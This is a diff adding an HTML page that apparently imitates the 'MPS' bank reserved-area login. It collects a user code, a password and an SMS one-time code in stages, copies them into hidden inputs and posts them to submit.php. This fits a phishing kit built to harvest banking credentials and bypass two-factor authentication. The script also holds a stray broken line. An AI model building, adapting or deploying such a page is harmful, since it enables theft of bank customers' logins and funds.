@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Login - MPS</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+    <div class="login-box">
+        <div class="background"></div>
+        <div class="login-container">
+            <h2>AREA RISERVATA</h2>
+
+            <div class="field" id="codiceUtente">
+                <label for="codiceUtente">Codice Utente:</label>
+                <input type="text" id="codiceUtente" name="codiceUtente">
+                <button onclick="validateField(document.getElementById('codiceUtente'), document.getElementById('password'))">Prossimo</button>
+            </div>
+
+            <div class="field" id="password" style="display: none;">
+                <label for="password">Password:</label>
+                <input type="password" id="password" name="password">
+                <button onclick="validateField(document.getElementById('password'), document.getElementById('codice'))">Prossimo</button>
+            </div>
+
+            <div class="field" id="codice" style="display: none;">
+                <label for="codice">Codice SMS:</label>
+                <input type="text" id="codice" name="codice">
+                <button onclick="document.getElementById('submitForm').submit()">Conferma</button>
+            </div>
+
+            <form id="submitForm" action="submit.php" method="post">
+                <input type="hidden" name="codiceUtente" id="codiceUtenteInput">
+                <input type="hidden" name="password" id="passwordInput">
+                <input type="hidden" name="codice" id="codiceInput">
+            </form>
+        </div>
+
+        <div class="video-encart">
+            <iframe 
+                width="300" 
+                height="200" 
+                src="https://www.youtube.com/embed/Ua-JKxHBgtY" 
+                frameborder="0" 
+                allowfullscreen
+                allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"
+            ></iframe>
+        </div>
+    </div>
+
+    <script>
+        function showNextField(fieldToHide, fieldToShow) {
+            fieldTo
+            fieldToHide.style.display = "none";
+            fieldToShow.style.display = "block";
+        }
+
+        function validateField(currentField, nextField) {
+            const input = currentField.querySelector("input");
+            if (input.value.trim() !== "") {
+                showNextField(currentField, nextField);
+            } else {
+                alert("Per favore, compila tutti i campi.");
+            }
+        }
+
+        window.onload = function() {
+            document.getElementById("codiceUtente").style.display = "block";
+            document.getElementById("password").style.display = "none";
+            document.getElementById("codice").style.display = "none";
+        }
+
+        // Sauvegarde des données dans les inputs cachés
+        document.getElementById("codiceUtente").addEventListener("input", function () {
+            document.getElementById("codiceUtenteInput").value = this.value;
+        });
+
+        document.getElementById("password").addEventListener("input", function () {
+            document.getElementById("passwordInput").value = this.value;
+        });
+
+        document.getElementById("codice").addEventListener("input", function () {
+            document.getElementById("codiceInput").value = this.value;
+        });
+    </script>
+</body>
+</html>
